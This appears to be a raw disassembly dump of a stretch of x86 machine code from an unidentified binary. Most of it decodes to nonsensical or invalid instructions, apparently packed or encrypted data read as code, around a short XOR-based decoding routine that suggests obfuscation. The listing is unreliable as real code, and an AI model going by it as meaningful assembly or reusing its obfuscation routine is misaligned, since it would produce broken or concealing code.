  411526:	ret    
  411527:	mov    ds:0x91a63831,eax
  41152c:	xor    al,0x9b
  41152e:	and    dh,BYTE PTR [eax-0x57912422]
  411534:	or     bh,BYTE PTR ds:0x79b96c09
  41153a:	jns    0x4115a5
  41153c:	push   0x8e4f9bdc
  411541:	lods   eax,DWORD PTR ds:[esi]
  411542:	loop   0x4114d2
  411544:	push   cs
  411545:	popa   
  411546:	xor    eax,0xed98881d
  41154b:	jo     0x41155c
  41154d:	adc    BYTE PTR [esi+eax*4+0x4e],0x8
  411552:	cmp    cl,dl
  411554:	mov    ebp,DWORD PTR [edi]
  411556:	ds sbb al,0x69
  411559:	jge    0x4115c5
  41155b:	sub    ebx,DWORD PTR [ebp-0x730e735b]
  411561:	and    eax,0x14d41e99
  411566:	shl    BYTE PTR [eax+edi*8+0x8eff325],0x84
  41156e:	inc    eax
  41156f:	adc    eax,0xb0d464b4
  411574:	or     bh,BYTE PTR [ebp-0x70]
  411577:	pushf  
  411578:	aad    0x1a
  41157a:	data16 fwait
  41157c:	dec    edi
  41157d:	cmp    BYTE PTR [ebx],ch
  41157f:	adc    al,0x4d
  411581:	repnz push ds
  411583:	daa    
  411584:	mov    bl,0x6c
  411586:	sub    ch,BYTE PTR [ebx-0x17]
  411589:	cwde   
  41158a:	gs mov esp,0x112b2d56
  411590:	test   DWORD PTR [eax+0x56],edi
  411593:	nop
  411594:	pop    edx
  411595:	scas   al,BYTE PTR es:[edi]
  411596:	cmp    al,0xe2
  411598:	push   cs
  411599:	xlat   BYTE PTR ds:[ebx]
  41159a:	ret    0x9509
  41159d:	jecxz  0x41153d
  41159f:	mov    dl,0x38
  4115a1:	or     edx,DWORD PTR [ecx]
  4115a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a4:	mov    DWORD PTR [eax+0x56],edi
  4115a7:	xchg   esp,eax
  4115a8:	(bad)  
  4115a9:	int    0x72
  4115ab:	xchg   edi,eax
  4115ac:	pop    eax
  4115ad:	inc    edx
  4115ae:	ins    BYTE PTR es:[edi],dx
  4115af:	loope  0x4115b5
  4115b1:	pop    ebp
  4115b2:	aam    0x40
  4115b4:	xchg   edi,eax
  4115b5:	sub    DWORD PTR [esi-0x71d2b2a0],esp
  4115bb:	pop    ecx
  4115bc:	xchg   cl,ah
  4115be:	aad    0xf4
  4115c0:	pop    esp
  4115c1:	in     al,dx
  4115c2:	pop    eax
  4115c3:	call   0x34adfcd8
  4115c8:	jo     0x41156f
  4115ca:	jnp    0x4115f4
  4115cc:	cmp    cl,cl
  4115ce:	mov    ebx,0xbab5d373
  4115d3:	daa    
  4115d4:	test   BYTE PTR [ecx],0xb8
  4115d7:	xchg   ebp,eax
  4115d8:	sbb    ch,BYTE PTR ds:0x21e3b3c3
  4115de:	xchg   edi,eax
  4115df:	adc    eax,0x2c24a4bd
  4115e4:	call   0xd0cd:0x8627eafd
  4115eb:	xchg   esi,eax
  4115ec:	fs or  bl,bh
  4115ef:	inc    eax
  4115f0:	rcl    BYTE PTR [esi],0xa2
  4115f3:	sahf   
  4115f4:	cmp    edi,DWORD PTR [edx+0x1c3d1846]
  4115fa:	push   edi
  4115fb:	dec    eax
  4115fc:	jle    0x411604
  4115fe:	ja     0x411584
  411600:	dec    esp
  411601:	(bad)  
  411602:	mov    dh,0x5b
  411604:	scas   al,BYTE PTR es:[edi]
  411605:	jmp    0x33817557
  41160a:	fimul  WORD PTR [esi]
  41160c:	loope  0x4115fa
  41160e:	in     eax,dx
  41160f:	add    BYTE PTR [eax+eiz*4-0x5f3bf932],bl
  411616:	popa   
  411617:	adc    BYTE PTR ds:0x397f4285,0x85
  41161e:	nop
  41161f:	shl    DWORD PTR [eax-0x6e25170d],cl
  411625:	cdq    
  411626:	fist   DWORD PTR [edi]
  411628:	stos   BYTE PTR es:[edi],al
  411629:	push   ecx
  41162a:	xchg   ebx,eax
  41162b:	cwde   
  41162c:	ja     0x41161c
  41162e:	xchg   ebp,eax
  41162f:	call   0xcc0e1a43
  411634:	push   ss
  411635:	stc    
  411636:	inc    edi
  411637:	sti    
  411638:	push   es
  411639:	sar    BYTE PTR [ebp+0x27],1
  41163c:	in     al,0x1e
  41163e:	shr    BYTE PTR [esi+esi*2],1
  411641:	push   edx
  411642:	push   0x5f6d30c7
  411647:	push   cs
  411648:	ja     0x41167e
  41164a:	ret    
  41164b:	push   edi
  41164c:	adc    DWORD PTR [edi+edi*2],0x1b
  411650:	cmc    
  411651:	jo     0x4116a8
  411653:	xchg   ebp,eax
  411654:	cld    
  411655:	mov    ecx,0x2ebb564d
  41165a:	int3   
  41165b:	push   0xfe13d1b5
  411660:	pop    ebp
  411661:	addr16 mov esi,0xd12dd6e6
  411667:	sub    edx,ebp
  411669:	mov    bh,0x5d
  41166b:	(bad)  
  41166c:	fsubr  st,st(6)
  41166e:	addr16 jb 0x411617
  411671:	inc    eax
  411672:	in     eax,dx
  411673:	xchg   esi,eax
  411674:	dec    BYTE PTR [edi+0xb]
  411677:	or     eax,0xde2a863c
  41167c:	push   ebp
  41167d:	mov    ds:0xc06ed89f,eax
  411682:	rcr    BYTE PTR [edi+eax*2],1
  411685:	test   al,0x8f
  411687:	mov    esi,0x53615450
  41168c:	sahf   
  41168d:	adc    al,0xb6
  41168f:	pop    ecx
  411690:	ins    BYTE PTR es:[edi],dx
  411691:	stos   DWORD PTR es:[edi],eax
  411692:	in     al,0x92
  411694:	data16 mov BYTE PTR [ebx-0x18d25655],cl
  41169b:	mov    cl,0xc1
  41169d:	jnp    0x411694
  41169f:	fdivr  st(0),st
  4116a1:	das    
  4116a2:	repnz adc DWORD PTR [edi-0x7],esi
  4116a6:	lock and bl,BYTE PTR [eax+0x4a]
  4116aa:	jg     0x4116c5
  4116ac:	mov    dl,BYTE PTR [eax-0x1f]
  4116af:	test   eax,0x1d1fdd88
  4116b4:	ret    0x492e
  4116b7:	cmp    ah,BYTE PTR [ebx]
  4116b9:	jne    0x41169b
  4116bb:	jns    0x4116f7
  4116bd:	mov    ds:0x590b9aa,al
  4116c2:	push   ebp
  4116c3:	add    edi,DWORD PTR [ebx+edi*8]
  4116c6:	shl    DWORD PTR [edi-0x47],0x60
  4116ca:	inc    ebx
  4116cb:	outs   dx,DWORD PTR ds:[esi]
  4116cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116cd:	sub    edi,DWORD PTR [edi+edx*8]
  4116d0:	mov    eax,ds:0x2d27bf35
  4116d5:	pop    edx
  4116d6:	pop    ebx
  4116d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116d8:	push   edx
  4116d9:	pop    ss
  4116da:	shl    BYTE PTR [ebx+0x4f],0xa5
  4116de:	in     al,dx
  4116df:	pop    eax
  4116e0:	daa    
  4116e1:	xchg   ecx,eax
  4116e2:	sub    edi,ebx
  4116e4:	inc    ebp
  4116e5:	cli    
  4116e6:	jae    0x4116af
  4116e8:	cs cdq 
  4116ea:	dec    ebx
  4116eb:	(bad)  
  4116ec:	cli    
  4116ed:	pop    es
  4116ee:	fcom   st(6)
  4116f0:	jnp    0x4116fb
  4116f2:	xchg   esi,eax
  4116f3:	(bad)  
  4116f4:	jmp    0x2894c606
  4116f9:	int    0x39
  4116fb:	dec    edi
  4116fc:	xchg   esp,eax
  4116fd:	jecxz  0x41175b
  4116ff:	jle    0x41176a
  411701:	sbb    esp,0x4a093645
  411707:	and    eax,0x9ddfe6f1
  41170c:	cwde   
  41170d:	pop    edi
  41170e:	mov    ds:0x8a8ac3aa,eax
  411713:	lahf   
  411714:	jns    0x4116ef
  411716:	fiadd  DWORD PTR [ecx]
  411718:	ss push ss
  41171a:	mov    esp,0x63b9d923
  41171f:	jmp    0x68e9:0x840246e3
  411726:	cmp    edi,0x971dc0e4
  41172c:	daa    
  41172d:	xor    bh,BYTE PTR [esi]
  41172f:	mov    ecx,0xfb77eba1
  411734:	mov    BYTE PTR [edi+0x61],bh
  411737:	outs   dx,BYTE PTR ds:[esi]
  411738:	mov    dl,0xeb
  41173a:	mov    edx,0x57c41c75
  41173f:	cwde   
  411740:	sahf   
  411741:	jle    0x411734
  411743:	or     edx,DWORD PTR [edi]
  411745:	xchg   esi,eax
  411746:	in     al,0xfd
  411748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411749:	dec    edi
  41174a:	jb     0x4117a0
  41174c:	jns    0x41176c
  41174e:	push   edi
  41174f:	(bad)  
  411750:	dec    edx
  411751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411752:	cdq    
  411753:	test   eax,0x37286e65
  411758:	stc    
  411759:	xor    esi,ecx
  41175b:	dec    esi
  41175c:	mov    ah,0xfb
  41175e:	mov    ch,0x48
  411760:	test   DWORD PTR [edi],0x2472c86e
  411766:	leave  
  411767:	jg     0x411785
  411769:	inc    edx
  41176a:	push   cs
  41176b:	jmp    0xfa56:0xcce2ea69
  411772:	push   edi
  411773:	dec    ebx
  411774:	out    0xdd,al
  411776:	dec    ebx
  411777:	push   ecx
  411778:	mov    BYTE PTR [ebp+0x6f],bh
  41177b:	dec    eax
  41177c:	ds mov ebx,0x3fd002d5
  411782:	fsubr  QWORD PTR [edx-0x50a7731a]
  411788:	push   esp
  411789:	in     al,dx
  41178a:	cs cmp eax,0x5832041b
  411790:	inc    ecx
  411791:	xchg   ebx,eax
  411792:	iret   
  411793:	pop    ebx
  411794:	push   esi
  411795:	mov    esi,0xd69239ef
  41179a:	dec    edx
  41179b:	mov    eax,DWORD PTR [esp+ebp*8+0x31]
  41179f:	push   es
  4117a0:	das    
  4117a1:	or     ah,dl
  4117a3:	dec    esi
  4117a4:	jbe    0x4117b6
  4117a6:	ja     0x4117fd
  4117a8:	fnsave [edx+0x75f5ef4]
  4117ae:	adc    bh,BYTE PTR [edi-0x55133930]
  4117b4:	jne    0x411786
  4117b6:	pusha  
  4117b7:	adc    DWORD PTR [edi],ecx
  4117b9:	retf   0xab54
  4117bc:	int3   
  4117bd:	les    ecx,FWORD PTR [ebx]
  4117bf:	fbld   TBYTE PTR [eax]
  4117c1:	cmp    eax,0x30ad549f
  4117c6:	in     eax,dx
  4117c7:	mov    esi,0x7c54df65
  4117cc:	adc    BYTE PTR [esi],0x3a
  4117cf:	push   esp
  4117d0:	shr    ebx,cl
  4117d2:	fmul   DWORD PTR [ebp+0x394f4949]
  4117d8:	sub    ecx,DWORD PTR [edi]
  4117da:	cmp    al,0xce
  4117dc:	and    bh,BYTE PTR [eax+0x9]
  4117df:	shl    ebp,cl
  4117e1:	popf   
  4117e2:	das    
  4117e3:	in     al,0x29
  4117e5:	cld    
  4117e6:	jecxz  0x41176a
  4117e8:	retf   0x3ba0
  4117eb:	add    bl,BYTE PTR [ebx+edx*1+0x62]
  4117ef:	lds    ecx,FWORD PTR [eax-0x48]
  4117f2:	adc    eax,0xa2ff9fb1
  4117f7:	mov    dh,0xba
  4117f9:	jnp    0x41185a
  4117fb:	(bad)  
  4117fc:	cmp    BYTE PTR [ebp+0x11],dl
  4117ff:	loopne 0x4117b5
  411801:	add    ch,BYTE PTR [ebx+0x3082d197]
  411807:	rol    DWORD PTR [esp+ebp*4+0x55],0x41
  41180c:	and    dh,ch
  41180e:	shl    dl,0x7
  411811:	jmp    0x3222c856
  411816:	retf   0x2a1c
  411819:	cmp    BYTE PTR [edx+esi*1],bh
  41181c:	stc    
  41181d:	mov    ecx,0xa77c13fa
  411822:	bound  ebx,QWORD PTR [eax+0x41]
  411825:	daa    
  411826:	inc    ebp
  411827:	aad    0x7e
  411829:	mov    bl,0xdd
  41182b:	jnp    0x4117e3
  41182d:	mov    dh,0x64
  41182f:	mov    ecx,0x7e7c0e8a
  411834:	lods   al,BYTE PTR ds:[esi]
  411835:	inc    edx
  411836:	sti    
  411837:	hlt    
  411838:	inc    edi
  411839:	fld    QWORD PTR [ebp+0x0]
  41183c:	nop
  41183d:	sbb    DWORD PTR [ebx+0x41],edx
  411840:	fdivp  st(3),st
  411842:	xchg   ebx,eax
  411843:	adc    bl,dh
  411845:	int    0x53
  411847:	xchg   esp,eax
  411848:	mov    ds:0x86c47b3b,eax
  41184d:	or     DWORD PTR [esi],eax
  41184f:	int    0x3a
  411851:	loope  0x41188e
  411853:	hlt    
  411854:	sbb    BYTE PTR [edi+0x7c],cl
  411857:	fcomip st,st(4)
  411859:	aaa    
  41185a:	mov    BYTE PTR [esi-0x17a0ada9],ah
  411860:	lods   eax,DWORD PTR ds:[esi]
  411861:	push   ecx
  411862:	pop    ds
  411863:	and    esp,ebx
  411865:	scas   al,BYTE PTR es:[edi]
  411866:	cdq    
  411867:	xor    DWORD PTR [ebx+eax*4],edx
  41186a:	stc    
  41186b:	fist   WORD PTR [esi+0x22]
  41186e:	jbe    0x4117f3
  411870:	neg    edi
  411872:	add    cl,bl
  411874:	jecxz  0x41188c
  411876:	sbb    BYTE PTR [eax-0x5a],ch
  411879:	jp     0x41180e
  41187b:	push   ebp
  41187c:	cmp    BYTE PTR [edx-0x3854caa7],ah
  411882:	mov    edx,edi
  411884:	dec    esp
  411885:	bound  ebx,QWORD PTR [ebx]
  411887:	sti    
  411888:	inc    esi
  411889:	ret    
  41188a:	stos   BYTE PTR es:[edi],al
  41188b:	jns    0x41186b
  41188d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41188f:	aaa    
  411890:	xchg   ecx,eax
  411891:	ins    BYTE PTR es:[edi],dx
  411892:	std    
  411893:	sub    ch,dh
  411895:	pop    ebx
  411896:	pop    esp
  411897:	aaa    
  411898:	xchg   ecx,eax
  411899:	seta   BYTE PTR [edi+edi*2+0x70]
  41189e:	push   0x7eef003f
  4118a3:	outs   dx,DWORD PTR ds:[esi]
  4118a4:	push   edi
  4118a5:	loopne 0x411899
  4118a7:	add    esi,DWORD PTR [ebp-0x5d356d36]
  4118ad:	jb     0x4118a6
  4118af:	out    dx,al
  4118b0:	push   ds
  4118b1:	stc    
  4118b2:	jp     0x41185b
  4118b4:	sub    ch,BYTE PTR [edi+0x4e]
  4118b7:	sub    BYTE PTR [ecx],0xa1
  4118ba:	jne    0x41188b
  4118bc:	sub    esi,DWORD PTR [ebp+0x1df8e23f]
  4118c2:	jb     0x411887
  4118c4:	mov    es,WORD PTR [edx]
  4118c6:	mov    ch,0xa0
  4118c8:	mov    ch,0xcd
  4118ca:	pop    edi
  4118cb:	aas    
  4118cc:	sub    dl,BYTE PTR ds:0x33d57458
  4118d2:	pop    edi
  4118d3:	shl    DWORD PTR [esi],1
  4118d5:	sub    eax,0xc6edfed
  4118da:	test   eax,0x2e586f27
  4118df:	or     bh,dh
  4118e1:	iret   
  4118e2:	sbb    bh,0x2e
  4118e5:	out    0xaa,al
  4118e7:	in     eax,0x4e
  4118e9:	add    eax,0x911b4123
  4118ee:	sbb    eax,DWORD PTR [edx+0x2430f0fe]
  4118f4:	push   esp
  4118f5:	or     DWORD PTR [edi-0x4],edi
  4118f8:	pop    ecx
  4118f9:	jmp    0x41195f
  4118fb:	pop    ss
  4118fc:	xor    al,0xca
  4118fe:	jbe    0x4118d9
  411900:	outs   dx,DWORD PTR ds:[esi]
  411901:	into   
  411902:	xchg   ebx,eax
  411903:	and    DWORD PTR [edi-0x64],ecx
  411906:	xor    ebx,DWORD PTR [ebx-0x3d]
  411909:	push   0x9a8496c6
  41190e:	js     0x4118ba
  411910:	pop    esp
  411911:	sbb    BYTE PTR [eax-0x1b],0x9e
  411915:	int    0x2b
  411917:	mov    ch,0x2e
  411919:	adc    DWORD PTR [edx-0x74bd2c31],ebx
  41191f:	adc    ecx,DWORD PTR [ebx+0x5750047b]
  411925:	push   edx
  411926:	call   0x41dfb1
  41192b:	shld   edx,eax,0x2
  41192f:	mov    ecx,edx
  411931:	xor    edx,edx
  411933:	or     ecx,edx
  411935:	mov    edx,DWORD PTR [esi]
  411937:	mov    edi,DWORD PTR [esi+0x4]
  41193a:	shl    eax,0x2
  41193d:	or     eax,DWORD PTR [ebp+0x10]
  411940:	xor    edi,ecx
  411942:	xor    edx,eax
  411944:	xor    edx,0xba699573
  41194a:	xor    edi,0x9c0a89d8
  411950:	mov    DWORD PTR [esi],edx
  411952:	mov    DWORD PTR [esi+0x4],edi
  411955:	jmp    0x418549
  41195a:	mov    eax,DWORD PTR [ebp-0x24]
  41195d:	add    eax,DWORD PTR [ebp-0x4]
  411960:	mov    DWORD PTR [ebp-0x28],eax
  411963:	mov    eax,DWORD PTR [ebp-0x28]
  411966:	mov    eax,DWORD PTR [ebp-0x4]
  411969:	mov    eax,DWORD PTR [ebp-0x28]
  41196c:	mov    eax,DWORD PTR [eax+0xc]
  41196f:	mov    edx,DWORD PTR [ebp-0x4]
  411972:	movzx  eax,WORD PTR [edx+eax*1]
  411976:	cdq    
  411977:	shld   edx,eax,0x2
  41197b:	xor    edx,ecx
  41197d:	mov    DWORD PTR [ebp+0xc],edx
  411980:	mov    edx,DWORD PTR [ebp-0x58]
  411983:	jmp    0x411f0d
  411988:	jle    0x411958
  41198a:	addr16 ss daa 
  41198d:	push   ds
  41198e:	ds sahf 
  411990:	dec    ebx
  411991:	clc    
  411992:	pushf  
  411993:	outs   dx,BYTE PTR ds:[esi]
  411994:	dec    ecx
  411995:	inc    ebp
  411996:	(bad)  
  411997:	outs   dx,BYTE PTR ds:[esi]
  411998:	(bad)  
  411999:	xor    dl,BYTE PTR [esi]
  41199b:	push   ss
  41199c:	cmp    eax,0xa161604
  4119a1:	add    BYTE PTR [ecx+0x2c],cl
  4119a4:	and    ch,BYTE PTR [ecx+ebx*1-0x5e32fdb1]
  4119ab:	shr    DWORD PTR [ebx],0x45
  4119ae:	jl     0x411a27
  4119b0:	pop    ecx
  4119b1:	fdivr  DWORD PTR [ecx-0x1cff8eba]
  4119b7:	push   esi
  4119b8:	ins    DWORD PTR es:[edi],dx
  4119b9:	das    
  4119ba:	movaps xmm0,xmm5
  4119bd:	aas    
  4119be:	int3   
  4119bf:	retf   
  4119c0:	repnz push esp
  4119c2:	(bad)  
  4119c3:	cmp    ah,ch
  4119c5:	push   eax
  4119c6:	fbld   TBYTE PTR [eax+edx*1]
  4119c9:	int3   
  4119ca:	push   esi
  4119cb:	mov    bh,0x90
  4119cd:	mov    BYTE PTR [eax-0x1f],0xd0
  4119d1:	xor    bh,dh
  4119d3:	push   edi
  4119d4:	add    ebp,DWORD PTR [ebp+0x2b]
  4119d7:	les    esi,FWORD PTR [edi]
  4119d9:	sub    al,0xf3
  4119db:	xchg   ecx,eax
  4119dc:	xor    BYTE PTR [edi-0x66],ah
  4119df:	fnstsw WORD PTR [edi]
  4119e1:	mov    cl,0x15
  4119e3:	sub    dl,al
  4119e5:	lock xlat BYTE PTR ds:[ebx]
  4119e7:	pop    ecx
  4119e8:	push   esp
  4119e9:	or     eax,0x3122218d
  4119ee:	aas    
  4119ef:	daa    
  4119f0:	shl    cl,0xeb
  4119f3:	dec    ebp
  4119f4:	addr16 jg 0x411a05
  4119f7:	outs   dx,DWORD PTR ds:[esi]
  4119f8:	adc    DWORD PTR [edi+0x67b747b8],esp
  4119fe:	ret    
  4119ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a00:	xor    BYTE PTR [edx-0x8],bl
  411a03:	mov    ch,0xdf
  411a05:	arpl   WORD PTR [ebx],bp
  411a07:	imul   edi,DWORD PTR [edx],0xffffffe0
  411a0a:	fld    QWORD PTR [ebx+eax*2+0x77]
  411a0e:	jnp    0x411a51
  411a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a11:	mov    ds:0xf323882a,al
  411a16:	jle    0x4119d4
  411a18:	mov    eax,ds:0x11f2ae70
  411a1d:	lock daa 
  411a1f:	(bad)  
  411a20:	ja     0x411a20
  411a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a23:	mov    cl,0x58
  411a25:	dec    eax
  411a26:	stos   BYTE PTR es:[edi],al
  411a27:	xchg   edi,eax
  411a28:	nop
  411a29:	or     bh,dh
  411a2b:	outs   dx,BYTE PTR ds:[esi]
  411a2c:	or     DWORD PTR [ebx],eax
  411a2e:	daa    
  411a2f:	popf   
  411a30:	sub    ebp,ebx
  411a32:	lods   al,BYTE PTR ds:[esi]
  411a33:	aam    0x8f
  411a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a36:	mov    DWORD PTR [eax+0x2a],edx
  411a39:	mov    eax,ds:0x156e839f
  411a3e:	or     BYTE PTR [ecx+0x2fd00d51],bl
  411a44:	mov    eax,0xd7333249
  411a49:	ficom  WORD PTR [esi-0x6b]
  411a4c:	mov    esi,DWORD PTR [ecx-0x2a]
  411a4f:	loopne 0x411a21
  411a51:	jns    0x411a03
  411a53:	adc    esi,DWORD PTR [eax-0x1]
  411a56:	mov    eax,ds:0x4b9ba2ac
  411a5b:	addr16 mov bh,0xdf
  411a5e:	jle    0x411a88
  411a60:	mov    esi,0xcda3d253
  411a65:	test   eax,0xf294da09
  411a6a:	imul   edx,DWORD PTR [eax+0x7d],0xe4cd7c84
  411a71:	in     al,dx
  411a72:	mov    al,ds:0x2709e735
  411a77:	xchg   ecx,eax
  411a78:	mov    eax,0xe8ac7cdc
  411a7d:	xor    DWORD PTR [edi-0x3e7b454b],edi
  411a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a84:	outs   dx,BYTE PTR ds:[esi]
  411a85:	mov    ebx,0x4e3e123f
  411a8a:	xor    DWORD PTR [ebp-0x60],0x6af923ad
  411a91:	es or  ebp,ebp
  411a94:	xor    al,0x1a
  411a96:	add    eax,0x3efb38f7
  411a9b:	sar    DWORD PTR [edi],1
  411a9d:	dec    esi
  411a9e:	sahf   
  411a9f:	enter  0xf874,0x6d
  411aa3:	mov    eax,0xab83651f
  411aa8:	mov    esi,0x13b3e1eb
  411aad:	mov    BYTE PTR [ebp-0x3b],dl
  411ab0:	int    0x80
  411ab2:	mov    dl,0x6e
  411ab4:	test   edi,ebx
  411ab6:	stos   DWORD PTR es:[edi],eax
  411ab7:	xor    al,0xaa
  411ab9:	je     0x411aef
  411abb:	ficom  WORD PTR [esi+0xe5d5efe]
  411ac1:	jo     0x411ad8
  411ac3:	lods   eax,DWORD PTR ds:[esi]
  411ac4:	daa    
  411ac5:	pop    esi
  411ac6:	cmp    al,bl
  411ac8:	cmp    ebx,edx
  411aca:	cmp    al,bl
  411acc:	push   edi
  411acd:	cmp    DWORD PTR [ebp+0x3f9eafef],0xb9e15536
  411ad7:	int    0xfe
  411ad9:	jne    0x411b1b
  411adb:	stos   WORD PTR es:[edi],ax
  411add:	std    
  411ade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411adf:	mov    cl,0xa2
  411ae1:	dec    ebx
  411ae2:	cs and esp,edi
  411ae5:	cmp    dl,dh
  411ae7:	and    al,0x1b
  411ae9:	inc    esi
  411aea:	cmc    
  411aeb:	loopne 0x411aec
  411aed:	xor    al,0x1e
  411aef:	and    al,0x7
  411af1:	ja     0x411b1c
  411af3:	cs and al,0x47
  411af6:	jg     0x411b4a
  411af8:	out    0x16,al
  411afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411afb:	pop    ebx
  411afc:	outs   dx,BYTE PTR ds:[esi]
  411afd:	pop    es
  411afe:	xchg   esi,eax
  411aff:	inc    ebp
  411b00:	mov    al,ds:0x8790ac79
  411b05:	pushf  
  411b06:	mov    ch,BYTE PTR [ebx+edi*4]
  411b09:	or     DWORD PTR [edi+0x7b6ee27c],0x5aff20d3
  411b13:	sbb    al,0x23
  411b15:	jmp    0xe971:0x3b4f262c
  411b1c:	rcl    BYTE PTR [ecx+0x32b92248],0x60
  411b23:	mov    esp,DWORD PTR [ebx+0x24]
  411b26:	dec    ebx
  411b27:	sahf   
  411b28:	xchg   ecx,eax
  411b29:	ret    0xa55e
  411b2c:	addr16 mov cl,0x9c
  411b2f:	adc    DWORD PTR [ecx-0x41bf529c],eax
  411b35:	push   ecx
  411b36:	pop    ss
  411b37:	cli    
  411b38:	cli    
  411b39:	sahf   
  411b3a:	loopne 0x411b65
  411b3c:	adc    BYTE PTR [ebx],ah
  411b3e:	repnz cld 
  411b40:	or     eax,0x8267d88
  411b45:	push   cs
  411b46:	xchg   esp,eax
  411b47:	int    0x13
  411b49:	push   0x2
  411b4b:	pusha  
  411b4c:	inc    edx
  411b4d:	mov    edi,0xa80ec626
  411b52:	stos   DWORD PTR es:[edi],eax
  411b53:	in     eax,dx
  411b54:	shl    dl,cl
  411b56:	inc    edx
  411b57:	test   DWORD PTR [eax-0x66],eax
  411b5a:	and    eax,0xf214c592
  411b5f:	jmp    0x411b58
  411b61:	and    DWORD PTR [edi+esi*4+0x66],esp
  411b65:	fneni(8087 only) 
  411b67:	add    BYTE PTR ds:0xe9b6be14,ch
  411b6d:	outs   dx,DWORD PTR ds:[esi]
  411b6e:	call   DWORD PTR [eax-0x7d162533]
  411b74:	mov    bl,0x68
  411b76:	ja     0x411b51
  411b78:	xor    DWORD PTR [esp+eax*2-0x6f1572e0],edx
  411b7f:	sbb    dh,BYTE PTR [edx+0x3f]
  411b82:	and    DWORD PTR [ebx],0x40
  411b85:	add    DWORD PTR [ebp+0x6],ecx
  411b88:	(bad)  
  411b89:	sub    DWORD PTR [ebx-0x43d8c677],esi
  411b8f:	les    ebp,FWORD PTR [ebp-0x8]
  411b92:	stos   BYTE PTR es:[edi],al
  411b93:	popa   
  411b94:	cmp    ebp,DWORD PTR [ecx-0xb]
  411b97:	cs pusha 
  411b99:	push   ecx
  411b9a:	mov    bh,0x4d
  411b9c:	cmp    ebx,ecx
  411b9e:	ret    0xe825
  411ba1:	popa   
  411ba2:	mov    al,ds:0x30d14ad6
  411ba7:	ins    DWORD PTR es:[edi],dx
  411ba8:	jge    0x411bd7
  411baa:	dec    esi
  411bab:	and    eax,0x9e32c91e
  411bb0:	mov    ah,0x1a
  411bb2:	nop
  411bb3:	add    ch,BYTE PTR [edi+0x6]
  411bb6:	mov    al,0xd
  411bb8:	xor    DWORD PTR [ecx+0x16],eax
  411bbb:	or     eax,0x29e9707a
  411bc0:	(bad)  
  411bc1:	(bad)  
  411bc3:	sbb    al,0xff
  411bc5:	inc    esi
  411bc6:	(bad)  
  411bc7:	cwde   
  411bc8:	cld    
  411bc9:	and    esi,DWORD PTR [ebp-0x30]
  411bcc:	mov    BYTE PTR [edx+0xf],ch
  411bcf:	sbb    ecx,DWORD PTR [eax+0x25]
  411bd2:	and    BYTE PTR [ebx],cl
  411bd4:	sub    BYTE PTR [ecx],0x12
  411bd7:	or     al,0xe6
  411bd9:	adc    DWORD PTR [edx+0x8be12dd],edx
  411bdf:	scas   eax,DWORD PTR es:[edi]
  411be0:	(bad)  
  411be1:	loope  0x411c33
  411be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411be4:	xchg   ebx,eax
  411be5:	inc    ebx
  411be6:	adc    ebx,DWORD PTR [esi-0x4b3ff615]
  411bec:	xchg   BYTE PTR [ecx+0x644832a0],ah
  411bf2:	xor    eax,DWORD PTR [esi+eiz*4-0xe]
  411bf6:	rol    BYTE PTR [edi-0x16045f7d],cl
  411bfc:	out    dx,eax
  411bfd:	pop    ebp
  411bfe:	dec    esp
  411bff:	xchg   DWORD PTR [esi-0x45c7ffb1],ecx
  411c05:	xor    ecx,DWORD PTR [eax+ebp*1-0x7b42231e]
  411c0c:	bound  esp,QWORD PTR [eax-0x14]
  411c0f:	out    dx,al
  411c10:	sub    DWORD PTR [esi],edi
  411c12:	sar    ebp,1
  411c14:	icebp  
  411c15:	call   0x465b:0x2ffbf248
  411c1c:	sti    
  411c1d:	push   0x2d251a3e
  411c22:	push   eax
  411c23:	aad    0x5e
  411c25:	and    ah,BYTE PTR [esi+ecx*4+0x2990e215]
  411c2c:	add    al,0x6f
  411c2e:	sub    DWORD PTR [ecx-0x4b],ebp
  411c31:	inc    esi
  411c32:	cmp    DWORD PTR [esi],ebx
  411c34:	sar    DWORD PTR [esp+esi*8-0x2b],0x88
  411c39:	outs   dx,BYTE PTR ds:[esi]
  411c3a:	xchg   esi,eax
  411c3b:	dec    esi
  411c3c:	inc    BYTE PTR [ebx-0xb]
  411c3f:	lods   al,BYTE PTR ds:[esi]
  411c40:	pop    edi
  411c41:	leave  
  411c42:	loopne 0x411bdc
  411c44:	mov    ebp,0xd9b3b71a
  411c49:	push   ebx
  411c4a:	sbb    al,0x94
  411c4c:	aam    0x39
  411c4e:	mov    ds:0x7c95b5c9,al
  411c53:	add    eax,0xb815faf0
  411c58:	push   edx
  411c59:	scas   eax,DWORD PTR es:[edi]
  411c5a:	push   ebp
  411c5b:	fptan  
  411c5d:	jmp    0x381e:0x2957e76a
  411c64:	ss push esi
  411c66:	fwait
  411c67:	mov    eax,DWORD PTR [ebx+0x1e]
  411c6a:	in     al,0xcf
  411c6c:	call   0xf646f553
  411c71:	ds or  al,0x5e
  411c74:	inc    esi
  411c75:	and    BYTE PTR [ecx+0x1a],dh
  411c78:	call   0xcc41:0x9141247c
  411c7f:	add    bl,BYTE PTR [eax+0x59c834ef]
  411c85:	rcl    DWORD PTR [esi-0x34],0x44
  411c89:	mov    dl,0xc9
  411c8b:	retf   0x3642
  411c8e:	js     0x411c9e
  411c90:	ror    edi,0x77
  411c93:	(bad)  
  411c94:	jmp    0x6322:0xcbd3dbfb
  411c9b:	std    
  411c9c:	push   eax
  411c9d:	rcl    edi,1
  411c9f:	sub    DWORD PTR [edx-0x59],esp
  411ca2:	test   eax,0xe08ee5f4
  411ca7:	mov    ebx,0x1411b203
  411cac:	out    0xe,eax
  411cae:	jp     0x411c68
  411cb0:	loopne 0x411cc4
  411cb2:	pop    ebx
  411cb3:	pop    esi
  411cb4:	call   0x297949ad
